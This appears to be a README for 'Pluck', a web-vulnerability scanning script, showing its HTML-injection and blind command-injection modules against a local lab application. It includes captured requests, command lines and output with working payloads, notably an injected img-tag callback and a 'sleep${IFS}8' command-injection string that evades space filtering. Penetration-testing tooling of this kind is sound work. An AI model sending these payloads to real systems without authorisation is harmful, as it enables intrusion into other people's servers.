# Pluck



### HTML Injection GET Request

**Obtain a request and save to a file**

```http
GET /htmli_get.php?firstname=test&lastname=test&form=submit HTTP/1.1
Host: 127.0.0.1:8888
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8888/htmli_get.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: security_level=0; PHPSESSID=ek9npeot2sop3ubofjaeul06l2
Connection: close

```

**Execute the script**

Set the module to `html_injection` and the parameters to `firstname` and `lastname`. The application found the correct payload and print out the unique ID.


```bash
python3 pluck.py -r /tmp/req -m "html_injection" -I "query" -P "firstname,lastname"
### Testing Parameters ###
URL:  http://127.0.0.1:8888/htmli_get.php?firstname=test&lastname=test&form=submit
PATH:  /htmli_get.php?firstname=test&lastname=test&form=submit
METHOD:  GET
Proxy: 127.0.0.1:8080
Parameters To Test:  ['firstname', 'lastname']
Modules to run:  ['html_injection']
Injection POints:  ['query']
[*] Executing the HTML Injection Tester module
Library Items:  1
[!] HTML Injection found in query firstname parameter with <div><img src='http://127.0.01/?r=q4OUnZcwKrcgAaBD&d= payload! Request ID: cde8bf77-b4d2-4509-8891-67b45770a8ab
```

**Found the request in burp**

Copy the request id and filter the HTTP history in burp to obtain the proper payload.

![image](https://github.com/user-attachments/assets/c9207c22-9b69-4864-b069-78f105dc533c)

The request contained the payload and therespose the injected HTML payload

![image](https://github.com/user-attachments/assets/56ad6cad-9822-46ee-909c-b20a4450167d)


### Blind Command Injection

Http request obtained from Burp:

```http
POST /commandi_blind.php HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 28
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8888/commandi_blind.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: security_level=0; PHPSESSID=ek9npeot2sop3ubofjaeul06l2
Connection: close

target=127.0.0.1&form=submit
```

Execute the script:

```bash
python3 pluck.py -r /tmp/req -m "command_inject" -I "body" -P "target"
### Testing Parameters ###
URL:  http://127.0.0.1:8888/commandi_blind.php
PATH:  /commandi_blind.php
METHOD:  POST
Proxy: 127.0.0.1:8080
Parameters To Test:  ['target']
Modules to run:  ['command_inject']
Injection POints:  ['body']
[*] Executing the OS Command Injector module
Reason:  Elapsed Time 18.036525
Generator Sleep:  15
Library Items:  1
[!] OS Command Injection found in body target parameter with 
sleep${IFS}8${IFS}&&${IFS}sleep${IFS}8# payload! Request ID: fb1bf360-9b3a-4d4b-b869-8bed588782ae
```

![image](https://github.com/user-attachments/assets/d6c52c66-14fd-4ea8-869a-9c9d8dc5d04d)

